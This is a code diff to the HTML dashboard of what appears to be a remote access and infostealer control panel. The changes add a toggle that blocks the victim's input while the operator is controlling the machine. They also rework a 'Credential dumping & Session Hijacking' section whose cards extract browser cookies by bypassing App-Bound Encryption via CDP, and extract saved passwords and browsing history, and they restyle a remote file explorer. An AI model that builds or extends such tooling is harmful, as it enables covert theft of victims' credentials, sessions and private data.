@@ -194,6 +194,16 @@
                                 </label>
                                 <span style="font-size: 13px; font-weight: 600; color: var(--text-muted);">Control</span>
                             </div>
+
+                            <div style="display: flex; align-items: center; gap: 8px; margin-left: 8px;" title="Block user input while controlling">
+                                <label class="toggle-switch toggle-danger">
+                                    <input type="checkbox" id="toggle-block-input" disabled>
+                                    <span class="slider"></span>
+                                </label>
+                                <span style="font-size: 13px; font-weight: 600; color: var(--text-muted);">
+                                    <i data-feather="lock" style="width: 14px; height: 14px; vertical-align: middle;"></i> Block
+                                </span>
+                            </div>
                         </div>
                     </div>
                     
@@ -359,39 +369,85 @@
                         <p class="subtitle">Credential dumping & Session Hijacking</p>
                     </div>
                     
-                    <div class="dashboard-grid">
-                        <div class="dash-card" onclick="requestStealCookies('brave')">
-                            <div class="card-icon" style="background: linear-gradient(135deg, #ff512f, #dd2476);">
-                                <i data-feather="chrome"></i>
+                    <!-- MAIN FEATURE SELECTION -->
+                    <div class="extraction-grid">
+                        <div class="extraction-card" onclick="openBrowserSelector('cookies')">
+                            <div class="extraction-icon" style="background: linear-gradient(135deg, #f97316, #ea580c);">
+                                <i data-feather="globe"></i>
                             </div>
-                            <h3>Brave Cookies</h3>
-                            <p>Bypass App-Bound (CDP Method)</p>
-                        </div>
-
-                        <div class="dash-card" onclick="requestStealCookies('chrome')">
-                            <div class="card-icon" style="background: linear-gradient(135deg, #fce38a, #f38181);">
-                                <i data-feather="chrome"></i>
-                            </div>
-                            <h3>Chrome Cookies</h3>
-                            <p>Bypass App-Bound (CDP Method)</p>
-                        </div>
-
-                        <div class="dash-card" onclick="requestStealCookies('coccoc')">
-                            <div class="card-icon" style="background: linear-gradient(135deg, #4ade80, #22c55e);">
-                                <i data-feather="compass"></i>
-                            </div>
-                            <div class="card-content">
-                                <h3>Cốc Cốc Cookies</h3>
-                                <p>Bypass App-Bound (CDP Method)</p>
+                            <div class="extraction-info">
+                                <h3>Browser Cookies</h3>
+                                <p>Extract cookies via CDP (Bypass App-Bound Encryption)</p>
                             </div>
                         </div>
 
-                        <div class="dash-card" onclick="requestStealPass('edge')">
-                            <div class="card-icon" style="background: linear-gradient(135deg, #00c6ff, #0072ff);">
+                        <div class="extraction-card" onclick="openBrowserSelector('passwords')">
+                            <div class="extraction-icon" style="background: linear-gradient(135deg, #ef4444, #b91c1c);">
                                 <i data-feather="key"></i>
                             </div>
-                            <h3>Edge Passwords</h3>
-                            <p>Decrypt Login Data (Standard)</p>
+                            <div class="extraction-info">
+                                <h3>Saved Passwords</h3>
+                                <p>Extract saved credentials from browsers</p>
+                            </div>
+                        </div>
+
+                        <div class="extraction-card" onclick="openBrowserSelector('history')">
+                            <div class="extraction-icon" style="background: linear-gradient(135deg, #8b5cf6, #6366f1);">
+                                <i data-feather="clock"></i>
+                            </div>
+                            <div class="extraction-info">
+                                <h3>Browser History</h3>
+                                <p>Extract browsing history (last 500 URLs)</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BROWSER SELECTOR MODAL -->
+                <div id="browser-selector-backdrop" class="modal-backdrop hidden"></div>
+                <div id="browser-selector-modal" class="modal styled-modal hidden" style="max-width: 550px; width: 550px;">
+                    <div class="modal-header" style="display: flex; justify-content: space-between; align-items: center;">
+                        <h2 id="browser-selector-title" style="display: flex; align-items: center; gap: 10px; font-size: 17px; margin: 0; font-weight: 600;">
+                            <i data-feather="chrome"></i> Select Browser
+                        </h2>
+                        <button class="btn-modal-close" onclick="closeBrowserSelector()" style="background: none; border: none; font-size: 22px; color: var(--text-muted); cursor: pointer; padding: 0; line-height: 1;">&times;</button>
+                    </div>
+                    <div class="modal-body" style="padding: 20px;">
+                        <div class="browser-grid" id="browser-grid">
+                            <!-- Browsers will be populated dynamically -->
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BROWSER HISTORY PANEL -->
+                <div id="history-modal" class="modal-overlay hidden">
+                    <div class="history-panel">
+                        <div class="history-header">
+                            <div class="history-title">
+                                <i data-feather="clock"></i>
+                                <span id="history-browser-name">Browser History</span>
+                                <span class="history-badge" id="history-count">0 items</span>
+                            </div>
+                            <div class="history-actions">
+                                <button class="btn-export" id="btn-export-history">
+                                    <i data-feather="download"></i> Export CSV
+                                </button>
+                                <button class="btn-close-history" onclick="closeHistoryModal()">&times;</button>
+                            </div>
+                        </div>
+                        <div class="history-body">
+                            <table class="history-table">
+                                <thead>
+                                    <tr>
+                                        <th style="width: 45%;">URL</th>
+                                        <th style="width: 30%;">Title</th>
+                                        <th style="width: 10%; text-align: center;">Visits</th>
+                                        <th style="width: 15%; text-align: right;">Last Visit</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="history-tbody">
+                                </tbody>
+                            </table>
                         </div>
                     </div>
                 </div>
@@ -424,15 +480,12 @@
                         </div>
                     </div>
                     
-                    <div class="content-toolbar">
-                        <input
-                        type="file"
-                        id="fileInput"
-                        style="display:none"
-                        />
+                    <div class="content-toolbar file-explorer-toolbar">
+                        <input type="file" id="fileInput" style="display:none">
+                        <input type="file" id="hidden-file-input" style="display: none;">
 
                         <div class="file-toolbar-group">
-                            <button class="btn btn-outline" id="btn-fs-upload" title="Upload File to Agent" onclick="triggerFileUpload()">
+                            <button class="btn btn-outline" id="btn-fs-upload" title="Upload File" onclick="triggerFileUpload()">
                                 <i data-feather="upload-cloud"></i>
                             </button>
                             <button class="btn btn-outline" id="btn-fs-new-folder" title="New Folder">
@@ -441,18 +494,16 @@
                             <button class="btn btn-outline" id="btn-fs-new-file" title="New File">
                                 <i data-feather="file-plus"></i>
                             </button>
-                            
-                            <div class="divider-vertical" style="height: 20px; margin: 0 4px;"></div>
-                            <button class="btn btn-outline" id="btn-fs-up" title="Up Level">
+                            <div class="divider-vertical"></div>
+                            <button class="btn btn-outline" id="btn-fs-up" title="Go Up">
                                 <i data-feather="arrow-up"></i>
                             </button>
-                            <input type="file" id="hidden-file-input" style="display: none;">
                         </div>
 
-                        <div class="input-wrapper file-address-bar">
-                            <i data-feather="hard-drive"></i>
-                            <input type="text" id="fs-path-input" placeholder="Path..." class="path-input">
-                            <button class="btn btn-sm btn-glass" id="btn-fs-go">Go</button>
+                        <div class="file-address-bar">
+                            <i data-feather="folder" class="address-icon"></i>
+                            <input type="text" id="fs-path-input" placeholder="Enter path...">
+                            <button class="btn btn-primary btn-go" id="btn-fs-go">Go</button>
                         </div>
                     </div>
 
